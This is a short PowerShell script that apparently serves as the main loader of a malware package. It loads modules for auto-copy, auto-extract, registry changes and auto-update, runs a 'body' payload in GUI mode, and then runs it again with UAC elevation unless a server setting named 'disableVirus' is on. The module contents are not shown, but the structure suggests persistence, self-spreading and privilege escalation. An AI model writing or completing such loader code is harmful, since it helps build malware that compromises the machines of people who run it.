. ./consts_holder.ps1
. ./utils.ps1
. ./embeddings.ps1
. ./autoupdate.ps1
. ./autocopy.ps1
. ./autoextract.ps1
. ./autoregistry.ps1

do_autoextract

do_autocopy

do_autoregistry

do_autoupdate

do_embeddings

RunMe -script (Get-BodyPath) -arg "guimode" -uac $false

if (-not $server.disableVirus)
{
    RunMe -script (Get-BodyPath) -arg "" -uac $true
}
